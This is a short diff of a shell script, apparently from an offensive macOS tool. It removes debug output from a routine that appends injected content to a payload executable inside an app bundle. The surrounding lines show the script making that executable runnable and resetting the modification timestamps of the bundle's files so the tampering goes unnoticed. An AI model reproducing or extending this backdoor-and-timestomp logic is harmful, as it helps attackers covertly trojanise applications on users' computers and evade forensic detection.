@@ -76,11 +76,8 @@ else
 		sed -i '' "\$s%\$%$CL\"%" "$TRUESRC/Contents/MacOS/$PayloadName"
 	fi
 	if [ "${5:0:12}" == "AppendToEnd_" ];then
-		echo in
 		TTA=$(echo "$5" | sed "s%AppendToEnd_%%g")
-		echo i will echo .$TTA. to .$TRUESRC/Contents/MacOS/$PayloadName.
 		echo -ne "$TTA" >> "$TRUESRC/Contents/MacOS/$PayloadName"
-		echo done
 	fi	
 	chmod 755 "$TRUESRC/Contents/MacOS/$PayloadName"
 	touch -m "$LMTA" "$TRUESRC" && touch -m "$LMTC" "$TRUESRC/Contents" && touch -m "$LMTIP" "$TRUESRC/Contents/Info.plist" && touch -m "$LMTEF" "$TRUESRC/Contents/MacOS" && touch -m "$LMTOE" "$TRUESRC/Contents/MacOS/$PayloadName"
